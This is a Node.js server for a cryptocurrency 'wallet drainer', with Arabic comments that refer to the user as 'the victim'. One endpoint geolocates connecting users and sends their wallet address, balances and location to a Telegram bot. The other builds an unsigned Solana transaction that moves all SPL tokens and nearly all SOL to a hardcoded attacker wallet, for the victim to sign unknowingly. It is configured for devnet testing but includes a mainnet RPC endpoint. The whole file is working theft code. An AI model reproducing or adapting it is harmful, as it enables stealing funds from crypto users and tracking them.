const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============ إعدادات السيرفر ============
const PORT = process.env.PORT || 5000;
const IS_DEVNET = true; // ✅ DEVNET للتجربة

// ============ متغيرات البيئة ============
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';

// ✅ قائمة RPCs لـ DEVNET
const RPC_ENDPOINTS = IS_DEVNET ? [
  'https://api.devnet.solana.com',
  'https://devnet.solana.com',
] : [
  'https://skilled-purple-lake.solana-mainnet.quiknode.pro/2cd592b99695fb08845ca4afddbc2b97d9825e1e/',
  'https://api.mainnet-beta.solana.com',
];

let connection;
let currentRpcIndex = 0;

function createConnection() {
  console.log(`🔌 [${IS_DEVNET ? 'DEVNET' : 'MAINNET'}] Using RPC: ${RPC_ENDPOINTS[currentRpcIndex]}`);
  return new Connection(RPC_ENDPOINTS[currentRpcIndex], 'confirmed');
}

connection = createConnection();

async function withRpcFallback(fn, fallbackIndex = 1) {
  try {
    return await fn(connection);
  } catch (error) {
    console.error(`❌ RPC error with ${RPC_ENDPOINTS[currentRpcIndex]}:`, error.message);
    if (fallbackIndex >= RPC_ENDPOINTS.length) {
      console.error("🚨 All RPC endpoints failed!");
      throw error;
    }
    console.log(`🔄 Switching to fallback RPC ${fallbackIndex + 1}/${RPC_ENDPOINTS.length}`);
    currentRpcIndex = fallbackIndex;
    connection = createConnection();
    return await fn(connection);
  }
}

// ============ متغيرات التخزين المؤقت ============
let cachedSolPrice = null;
let lastPriceUpdate = 0;
const PRICE_CACHE_DURATION = 30 * 60 * 1000;

// ============ دوال مساعدة ============
async function getIPLocation(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const data = response.data;
    if (data.status === 'success') {
      return {
        country: data.country,
        countryCode: data.countryCode,
        region: data.regionName,
        city: data.city,
        flag: getCountryFlag(data.countryCode)
      };
    }
  } catch (error) {
    console.error('IP geolocation error:', error);
  }
  return null;
}

function getCountryFlag(countryCode) {
  if (!countryCode) return '🌍';
  const flagMap = {
    'US': '🇺🇸', 'TR': '🇹🇷', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 
    'CA': '🇨🇦', 'AU': '🇦🇺', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳',
    'IN': '🇮🇳', 'BR': '🇧🇷', 'RU': '🇷🇺', 'IT': '🇮🇹', 'ES': '🇪🇸',
    'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'SG': '🇸🇬', 'CH': '🇨🇭',
    'EG': '🇪🇬', 'SA': '🇸🇦', 'AE': '🇦🇪'
  };
  return flagMap[countryCode] || '🌍';
}

async function getSolPrice() {
  const now = Date.now();
  
  if (cachedSolPrice && (now - lastPriceUpdate) < PRICE_CACHE_DURATION) {
    return cachedSolPrice;
  }
  
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    cachedSolPrice = response.data.solana.usd;
    lastPriceUpdate = now;
    console.log(`💰 SOL price updated: $${cachedSolPrice}`);
    return cachedSolPrice;
  } catch (error) {
    console.error('Error fetching SOL price:', error.message);
    return cachedSolPrice || 170;
  }
}

// ============ نقاط النهاية (Endpoints) ============

app.post('/notify', async (req, res) => {
  try {
    const { address, balance, usdBalance, walletType, customMessage, splTokens, ip } = req.body;

    let rawIP = ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    
    if (rawIP.includes(',')) {
      const ips = rawIP.split(',').map(ip => ip.trim());
      rawIP = ips.find(ip => !ip.startsWith('10.') && !ip.startsWith('192.168.') && !ip.startsWith('172.')) || ips[0];
    }
    
    const clientIP = rawIP;
    const locationInfo = await getIPLocation(clientIP);
    const solPrice = await getSolPrice();
    const solBalanceNum = parseFloat(balance) || 0;
    const solUSD = solPrice ? (solBalanceNum * solPrice) : 0;

    let totalUSD = solUSD;
    let splTokensStr = '';

    if (splTokens && splTokens.length > 0) {
      splTokensStr = '\n💎 SPL Tokens:\n';
      for (const token of splTokens) {
        const tokenValue = token.usdValue || 0;
        totalUSD += tokenValue;
        splTokensStr += `• ${token.symbol || 'Unknown'}: ${token.balance} ($${tokenValue.toFixed(2)})\n`;
      }
    }

    let locationStr = locationInfo ? locationInfo.flag : '🌍';
    const shortAddress = address ? `${address.substring(0, 6)}...${address.substring(address.length - 4)}` : 'Unknown';
    const networkTag = IS_DEVNET ? '🧪 [DEVNET TEST] ' : '';

    let text;
    if (customMessage) {
      text = `${networkTag}${customMessage}

💳 Wallet: ${walletType || 'Unknown'}
📍 Address: \`${shortAddress}\`
💰 Value: $${totalUSD.toFixed(2)}
📍 Location: ${locationStr}
🕒 Time: ${new Date().toLocaleString()}`;
    } else {
      text = `${networkTag}🌺 New Connection worth $${totalUSD.toFixed(2)}

Address: \`${shortAddress}\`
ⓘ Wallet: ${walletType || 'Unknown'}
💰 Balance: ${balance || '0'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 ${locationStr}`;
    }

    if (BOT_TOKEN && CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text,
        parse_mode: 'Markdown'
      });
      console.log('📨 Telegram notification sent successfully');
    } else {
      console.log('⚠️ BOT_TOKEN or CHAT_ID not configured');
    }

    res.json({ ok: true });
  } catch (e) {
    console.error('Error in /notify:', e.message);
    res.status(500).json({ error: "telegram error" });
  }
});

app.post('/prepare-transaction', async (req, res) => {
  try {
    const { publicKey, verified } = req.body;
    if (!publicKey) {
      return res.status(400).json({ error: "publicKey required" });
    }
    
    console.log(`📝 [${IS_DEVNET ? 'DEVNET' : 'MAINNET'}] Preparing transaction for: ${publicKey}`);
    
    const fromPubkey = new PublicKey(publicKey); // محفظة الضحية
    const receiverWallet = new PublicKey(RECEIVER_WALLET_ADDRESS); // محفظة المستلم
    const transaction = new Transaction();
    let tokenTransfers = 0;

    // ✅ تم إزالة المكافأة الوهمية نهائياً (كانت تسبب خطأ Missing signature)
    // المعاملة الآن ستقوم فقط بتحويل الأصول من الضحية إلى المستلم

    // ✅ جلب ومعالجة الـ SPL Tokens باستخدام الـ RPC الذكي
    const tokenAccounts = await withRpcFallback(async (conn) =>
      conn.getParsedTokenAccountsByOwner(fromPubkey, { programId: TOKEN_PROGRAM_ID })
    );
    
    console.log(`🪙 Found ${tokenAccounts.value.length} token accounts`);

    for (const tokenAccount of tokenAccounts.value) {
      try {
        const accountData = tokenAccount.account.data;
        const parsedInfo = accountData.parsed.info;
        const mintAddress = parsedInfo.mint;
        const balance = parsedInfo.tokenAmount;

        if (balance.uiAmount > 0) {
          console.log(`🪄 Processing token ${mintAddress} with balance ${balance.uiAmount}`);
          const mint = new PublicKey(mintAddress);
          const fromTokenAccount = new PublicKey(tokenAccount.pubkey);
          const toTokenAccount = await getAssociatedTokenAddress(mint, receiverWallet);

          const receiverAccountInfo = await withRpcFallback(async (conn) =>
              conn.getAccountInfo(toTokenAccount)
            );
          if (!receiverAccountInfo) {
            transaction.add(
              createAssociatedTokenAccountInstruction(
                fromPubkey,
                toTokenAccount,
                receiverWallet,
                mint
              )
            );
          }

          transaction.add(
            createTransferInstruction(
              fromTokenAccount,
              toTokenAccount,
              fromPubkey,
              balance.amount
            )
          );
          tokenTransfers++;
          console.log(`✅ Added transfer for token ${mintAddress}`);
        }
      } catch (error) {
        console.log(`⚠️ Error processing token:`, error.message);
      }
    }

    // ✅ تحويل SOL (العملة الأساسية) من الضحية إلى المستلم
    const solBalance = await withRpcFallback(async (conn) => conn.getBalance(fromPubkey));
    const minBalance = await withRpcFallback(async (conn) => conn.getMinimumBalanceForRentExemption(0));
    const estimatedFees = (tokenTransfers + 1) * 5000 + (tokenTransfers * 2039280);
    const availableBalance = solBalance - minBalance - estimatedFees;
    const solForTransfer = Math.floor(availableBalance * 0.95); // ترك 5% للرسوم
    
    // ✅ نتحقق أن المبلغ موجب قبل الإضافة
    if (solForTransfer > 5000) { // على الأقل 5000 lamports (0.000005 SOL) لتغطية الرسوم
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: receiverWallet,
          lamports: solForTransfer,
        })
      );
      console.log(`💰 Added SOL transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
    } else {
      console.log(`⚠️ No SOL to transfer (balance too low: ${solBalance / LAMPORTS_PER_SOL} SOL)`);
    }

    // ✅ إذا لم توجد أي تعليمات في المعاملة، نضيف تعليمات وهمية بسيطة (إرسال 0 SOL)
    // هذا لتجنب المعاملات الفارغة التي قد تسبب مشاكل
    if (transaction.instructions.length === 0) {
      console.log('⚠️ No instructions added, creating dummy transaction');
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: fromPubkey, // إرسال لنفسه (لن يغير شيئاً)
          lamports: 1000,
        })
      );
    }

    const { blockhash } = await withRpcFallback(async (conn) => conn.getLatestBlockhash());
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = fromPubkey;

    const serializedTransaction = transaction.serialize({
      requireAllSignatures: false,
      verifySignatures: false,
    });

    res.json({ 
      transaction: Array.from(serializedTransaction),
      tokenTransfers: tokenTransfers,
      solTransfer: solForTransfer > 0 ? solForTransfer : 0
    });
    
    console.log(`✅ Transaction prepared with ${tokenTransfers} token transfers`);
    
  } catch (e) {
    console.error('❌ Error in /prepare-transaction:', e.message);
    res.status(500).json({ error: "transaction preparation error: " + e.message });
  }
});

// ============ نقطة صحة السيرفر ============
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    network: IS_DEVNET ? 'devnet' : 'mainnet',
    timestamp: new Date().toISOString() 
  });
});

// ============ تشغيل السيرفر ============
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🌐 Network: ${IS_DEVNET ? 'DEVNET (TESTNET)' : 'MAINNET (LIVE)'}`);
  console.log(`📦 Receiver wallet: ${RECEIVER_WALLET_ADDRESS}`);
  console.log(`📍 Health check: http://localhost:${PORT}/health`);
});

// ============ تحديث السعر بشكل دوري ============
setInterval(async () => {
  await getSolPrice();
}, PRICE_CACHE_DURATION);

getSolPrice(); // تحديث أولي